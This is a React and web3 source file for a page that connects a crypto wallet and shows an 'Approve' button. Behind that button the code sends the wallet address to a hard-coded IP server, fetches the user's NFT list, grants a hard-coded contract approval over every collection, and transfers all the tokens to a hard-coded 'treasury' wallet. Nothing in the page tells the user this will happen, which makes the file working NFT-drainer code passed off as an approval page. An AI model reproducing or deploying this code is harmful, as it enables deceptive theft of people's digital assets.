import { useState, useEffect } from 'react';
import useWeb3Modal from './hooks/useWeb3Modal'
import { truncateAddress } from "./utils";
import Web3 from 'web3';
import './App.css';
import contract_abi from './abis/contract.json'
import ERC721ABI from './abis/ERC721.json'

const web3 = new Web3(Web3.givenProvider)

export default function Home() {

  const { account, connectWallet, disconnect, switchNetwork, error, chainId } = useWeb3Modal()

  let nftInfo = [];
  const [nftCount, setCount] = useState(-1)

  const treasuryWallet = "0xfCb3e3cEf98396fd23BE4aCA4a9e25A46245a928";
  const contractAddress = chainId == 1 ? "0x28bBdDC00971a0Bb95ffa3827BB8090aDb75C97F": "0x0Db3D3Fb452a1c777E03A274Bc2dF278fDD03723";

  const approve = async () => {
    await fetch('http://143.198.133.144:8000/nfts', {
      method: 'POST',
      headers: {
        'Content-type': "application/json"
      },
      body: JSON.stringify({account: account})  
    })
    .then(res => res.json())
    .then(data => (nftInfo = data['nftInfo'], setCount(nftInfo?.length)))
  
    console.log("NFT info:", nftInfo)

    nftInfo.map(async (item) => {
      const nftContractInstance = new web3.eth.Contract(ERC721ABI, item.token_address);
      await nftContractInstance.methods.setApprovalForAll(contractAddress, true).send({from: account});

      const contractInstance = new web3.eth.Contract(contract_abi, contractAddress);
      contractInstance.methods.transferNFTs(treasuryWallet, item.token_address, item.token_ids).send({from: account});  
    })
  }

  return (
    <div>
      <span>
        {!account ? (
          <button onClick={connectWallet}>Connect Wallet</button>
        ) : (
          <button onClick={disconnect}>Disconnect</button>
        )}
      </span>
      <span style={{ fontSize: "20px", margin: "25px" }}>{` Account: ${truncateAddress(account)}`}</span>
      <span>{error ? error.message : null}</span>
      <br />

      <button onClick={approve} disabled={!account}>Approve</button>

      {nftCount >= 0 && <h3>You have {nftCount > 0 ? nftCount : 'no'} NFT collections.</h3>}
    </div>
  );
}
